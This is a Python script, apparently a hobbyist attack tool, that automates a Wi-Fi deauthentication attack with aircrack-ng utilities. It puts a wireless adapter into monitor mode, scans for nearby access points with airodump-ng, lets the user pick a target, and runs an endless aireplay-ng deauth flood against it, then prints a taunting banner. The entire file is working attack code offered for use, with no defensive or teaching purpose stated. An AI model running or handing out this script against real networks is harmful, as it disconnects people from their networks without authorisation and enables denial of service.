#!/usr/bin/env python3

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

W = '\033[0m'
R = '\033[31m' 
G = '\033[32m' 
O = '\033[33m' 
B = '\033[34m' 
P = '\033[35m' 
C = '\033[36m' 
GR = '\033[37m'

active_wireless_networks = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

print(R + """ .S     S.    .S       
.SS     SS.  .SS       
S%S     S%S  S%S       
S%S     S%S  S%S       
S%S     S%S  S&S       
S&S     S&S  S&S       
S&S     S&S  S&S       
S&S     S&S  S&S       
S*S     S*S  S*S       
S*S  .  S*S  S*S       
S*S_sSs_S*S  S*S       
SSS~SSS~S*S  S*S       
             SP        
             Y         
                       
  sSSs   .S       S.   
 d%%SP  .SS       SS.  
d%S'    S%S       S%S  
S%S     S%S       S%S  
S&S     S&S       S&S  
S&S_Ss  S&S       S&S  
S&S~SP  S&S       S&S  
S&S     S&S       S&S  
S*b     S*b       d*S  
S*S     S*S.     .S*S  
S*S      SSSbs_sdSSS   
S*S       YSSP~YSSY    
SP                     
Y                      
                       
  sSSs   .S    S.      
 d%%SP  .SS    SS.     
d%S'    S%S    S&S     
S%S     S%S    d*S     
S&S     S&S   .S*S     
S&S     S&S_sdSSS      
S&S     S&S~YSSY%b     
S&S     S&S    `S%     
S*b     S*S     S%     
S*S.    S*S     S&     
 SSSbs  S*S     S&     
  YSSP  S*S     SS     
        SP             
        Y """)

if not 'SUDO_UID' in os.environ.keys():
    print(R + "[+] Error - " + O + "Use sudo." + W)
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print(O + "[+] - Moving existing .csv file in the current directory to the backup folder." + W)
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print(GR + "[+] - Backup folder exists." + W)
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("wlan[0-9]")

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print(R + "[+] Error - " + O + "No wireless adapter found." + W)
    exit()

print(B + "[+] - Wireless adapter available. \n" + W)
for index, item in enumerate(check_wifi_result):
    print(C + f"{index}" + B +"-" + C + f"{item}" + W)

while True:
    wifi_interface_choice = input(B + "\n[+] - Select adapter : " + W)
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print(B + "[+] - Select an access point index : " + W)

hacknic = check_wifi_result[int(wifi_interface_choice)]

print(P + "[+] - Killing interface opened process." + W)
#subprocess.run(["ip", "link", "set", hacknic, "down"])
#subprocess.run(["airmon-ng", "check", "kill"])
print(P + "[+] - Enable monitor mode." + W)
#subprocess.run(["iw", hacknic, "set", "monitor", "none"])
#subprocess.run(["ip", "link", "set", hacknic, "up"])
subprocess.run(["airmon-ng", "start", hacknic])

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print(P + "[+] - Scanning. Press Ctrl+C ready.\n" + W)
        print(B + "No |\tBSSID              |\tESSID                    |" + W)
        print(B + "___|\t___________________|\t_________________________|" + W)
        for index, item in enumerate(active_wireless_networks):
            print(P + f"{index}\t{item['BSSID']}\t\t{item['ESSID']}" + W)
        time.sleep(1)

except KeyboardInterrupt:
    print(B + "\n[+] - Stoping scan." + W)

while True:
    choice = input(B + "[+] - Select access point : " + W)
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print(O + "[+] - Try again." + W)

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
#subprocess.run(["airmon-ng", "start", hacknic, hackchannel])
subprocess.run(["iwconfig", hacknic, "channel", hackchannel])
try:
    print(R)
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
except KeyboardInterrupt:
    subprocess.run(["airmon-ng", "stop", hacknic])
    print(G + "\n\n[UwU]" + P + "You Get Wifucked" + G + "[UwU]" + W)
